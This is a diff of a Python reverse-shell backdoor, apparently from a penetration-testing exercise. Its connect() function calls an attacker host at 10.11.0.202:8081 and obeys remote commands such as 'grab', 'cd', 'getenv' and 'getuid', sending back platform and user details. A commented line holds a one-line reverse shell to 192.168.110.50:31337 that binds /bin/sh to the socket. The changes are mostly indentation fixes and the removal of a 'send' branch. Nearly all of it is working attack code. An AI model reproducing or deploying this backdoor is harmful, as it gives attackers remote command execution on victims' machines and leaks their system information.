@@ -1,6 +1,6 @@
 #!/usr/bin/python
-import commands
-import shutil
+#import commands
+#import shutil
 import socket
 import subprocess
 import os
@@ -46,7 +46,7 @@ def recieve(s):
             break
 
 def connect():
-	#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.50",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+    #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.110.50",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(('10.11.0.202', 8081))
@@ -58,8 +58,8 @@ def connect():
 
         if 'terminate' in command:
             sock.send("Connection is shutting down ..................\n\n")
-	    s.close()
-	    break
+            s.close()
+            break
 
 
 # if we received grab keyword from the attacker, then this is an indicator for
@@ -81,10 +81,6 @@ def connect():
                 s.send ( str(e) )  # send the exception error
                 pass
 
-        elif 'send' in command:
-            print('We found send in command')
-            recieve(s)
-
 
         elif 'cd' in command:# the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
             code,directory = command.split(" ") # split up the received command based on space into two variables
@@ -92,11 +88,12 @@ def connect():
             # we send back a string mentioning the new CWD Note, os.getcwd should stop it from hanging
             s.send( "[+] CWD Is " + os.getcwd() )
 
+
         elif 'getenv' in command:
-        	   s.send( "[+] Platform Is " + platform.platform())
+            s.send( "[+] Platform Is " + platform.platform())
 
         elif 'getuid' in command:
-        		s.send( "[+] UserID Is " + os.environ.get('USERNAME'))
+            s.send( "[+] UserID Is " + os.environ.get('USERNAME'))
 
 
         else:
